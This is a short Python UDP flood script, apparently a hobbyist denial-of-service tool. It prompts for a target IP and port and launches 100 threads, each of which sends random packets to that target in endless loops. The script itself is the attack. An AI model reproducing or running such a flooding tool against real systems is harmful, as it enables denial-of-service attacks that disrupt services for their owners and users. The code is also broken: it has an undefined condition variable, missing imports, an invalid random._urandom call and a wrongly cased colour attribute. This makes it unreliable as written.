#!/usr/bin/env python3
#Code by DauB
import random
import socket
import threading

if akamata == '11':
        colorama.init()
        print("DauBcode")
        print("UDP FLOOD")
        ip = str(input(" IP:"))
        port = int(input(" PORT:"))

        def run2():
            data = random._urandom(1024, 60000)
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.connect((ip,port))
                    s.send(data)
                    for x in range(100):
                        s.send(data)
                    print(Fore.Blue + '[UDP]' + Fore.GREEN + '> Send Packet')
                except:
                    s.close()
                    print(Fore.BLUE + '[UDP]' + Fore.GREEN + '> Send Packet')

        for y in range(100):
                th = threading.Thread(target = run2)
                th.start()
